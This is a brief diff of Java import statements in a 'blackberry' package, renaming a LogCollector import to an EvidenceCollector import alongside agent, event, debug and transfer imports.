@@ -17,7 +17,7 @@ import blackberry.agent.Agent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
-import blackberry.log.LogCollector;
+import blackberry.evidence.EvidenceCollector;
 import blackberry.transfer.ProtocolException;
 import blackberry.transfer.Transfer;
 import blackberry.utils.Check;
